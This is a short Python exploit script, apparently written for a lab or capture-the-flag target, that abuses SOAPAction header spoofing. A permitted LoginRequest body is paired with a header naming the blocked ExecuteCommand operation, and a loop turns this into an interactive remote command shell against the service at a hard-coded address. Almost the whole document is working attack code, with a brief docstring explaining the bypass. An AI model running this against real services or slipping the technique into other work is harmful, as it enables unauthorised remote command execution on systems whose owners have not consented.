"""
We specify LoginRequest in <soap:Body>, so that our request goes through. This operation is allowed from the outside.
We specify the parameters of ExecuteCommand because we want to have the SOAP service execute a whoami command.
We specify the blocked operation (ExecuteCommand) in the SOAPAction header
"""

import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://10.129.226.244:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)


